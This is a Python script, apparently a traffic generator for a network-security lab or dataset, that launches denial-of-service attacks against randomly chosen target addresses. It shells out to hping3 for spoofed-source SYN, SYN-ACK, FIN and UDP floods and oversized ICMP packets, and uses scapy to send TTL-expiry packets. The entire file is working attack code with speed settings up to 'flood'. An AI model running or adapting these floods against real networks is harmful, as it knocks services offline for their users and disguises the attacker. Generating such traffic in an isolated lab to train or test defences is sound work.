import scapy.all as scapy
import sys
import os
import random
from normal_traffic import networks,ctrl_c_handler
import signal
attack = ["tcp_syn_ack","udp","icmp_frag","fin","syn","ttl_expiry"]
packet_interval = ["fast","faster","flood"]

def ttl_expiry_attack(net):
    p = scapy.IP(dst=random.choice(networks[net]),ttl = 2)/scapy.TCP(sport=80,dport=random.randint(1025,65534))
    scapy.send(p, inter = 0.01)

def tuple_gen(network):
    return random.randint(1025,65534),random.randint(80,1000),random.choice(networks[network])

def attack_check(type,network,speed):

    if type == "tcp_syn_ack":
        os.system("sudo hping3 --syn --ack --rand-source --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
    elif type == "udp":
        os.system("sudo hping3 --udp --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
    elif type == "icmp_frag":
        os.system("sudo hping3 -1 -d 10000 -i u10 " + network)
    elif type == "fin":
        os.system("sudo hping3 --fin --rand-source --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
    elif type == "syn":
        os.system("sudo hping3 --syn --rand-source --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
    elif type == "ttl_expiry":
        ttl_expiry_attack(network)



if __name__ == "__main__":
    signal.signal(signal.SIGALRM, ctrl_c_handler)
    try: 
        attack_type = sys.argv[1]
        speed = sys.argv[2]
        network = sys.argv[3]
    except IndexError as e:
        print("Not all parameters provided: {}".format(e))
    
    signal.alarm(50)
    if speed in packet_interval and attack_type in attack:
        attack_check(attack_type,network,speed)
        